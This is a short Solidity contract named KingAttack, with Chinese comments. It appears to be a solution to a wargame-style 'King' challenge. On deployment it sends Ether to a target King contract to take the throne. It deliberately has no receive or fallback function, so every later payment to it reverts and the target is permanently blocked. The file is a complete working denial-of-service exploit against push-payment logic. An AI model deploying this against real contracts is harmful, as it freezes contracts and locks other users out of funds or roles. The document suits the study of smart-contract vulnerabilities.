// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    // 部署時直接傳入 King 實例的地址，並帶上足夠的 Ether
    constructor(address _target) payable {
        // 使用 call 發送 Ether，觸發 King 合約的 receive()
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Attack failed: Could not become King");
    }

    // 關鍵點：這裡完全不寫 receive() 或 fallback()
    // 任何嘗試發送 Ether 給此合約的行為都會觸發 Revert
}
